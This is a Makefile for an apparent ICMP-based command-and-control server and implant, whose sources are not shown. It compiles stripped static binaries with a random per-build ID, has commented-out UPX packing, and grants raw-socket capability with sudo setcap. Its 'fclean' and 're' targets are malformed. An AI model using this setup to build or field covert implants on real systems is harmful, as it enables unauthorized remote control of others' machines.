OUTDIR = ./bin
SRCDIR = ./src
OBJDIR = ./obj
CC = gcc
RAND_ID_VAL := $(shell bash -c 'echo $$RANDOM')
CFLAGS = -Wall -Werror -D_FORTIFY_SOURCE=2 -s -DRAND_ID=

all: icmp-c2 icmp-implant

icmp-c2: obj/icmp-c2.o obj/c2.o obj/utils.o
	$(CC) -static $(OBJDIR)/icmp-c2.o $(OBJDIR)/c2.o $(OBJDIR)/utils.o -o $(OUTDIR)/icmp-c2 $(CFLAGS)
	# upx $(OUTDIR)/icmp-c2
	sudo setcap cap_net_raw=ep $(OUTDIR)/icmp-c2

icmp-implant: obj/icmp-implant.o obj/implant.o obj/utils.o
	$(CC) -static $(OBJDIR)/icmp-implant.o $(OBJDIR)/implant.o $(OBJDIR)/utils.o -o $(OUTDIR)/icmp-implant $(CFLAGS)
	# upx $(OUTDIR)/icmp-implant

obj/icmp-implant.o:
	$(CC) $(CFLAGS) -c $(SRCDIR)/icmp-implant.c -o $(OBJDIR)/icmp-implant.o

obj/implant.o:
	$(CC) $(CFLAGS)$(RAND_ID_VAL) -c $(SRCDIR)/implant.c -o $(OBJDIR)/implant.o

obj/icmp-c2.o:
	$(CC) $(CFLAGS) -c $(SRCDIR)/icmp-c2.c -o $(OBJDIR)/icmp-c2.o

obj/c2.o:
	$(CC) $(CFLAGS) -c $(SRCDIR)/c2.c -o $(OBJDIR)/c2.o

obj/utils.o:
	$(CC) $(CFLAGS)$(RAND_ID_VAL) -c $(SRCDIR)/utils.c -o $(OBJDIR)/utils.o

clean:
	rm -f $(OBJDIR)/* $(OUTDIR)/*

fclean:
	clean

re:
	fclean all
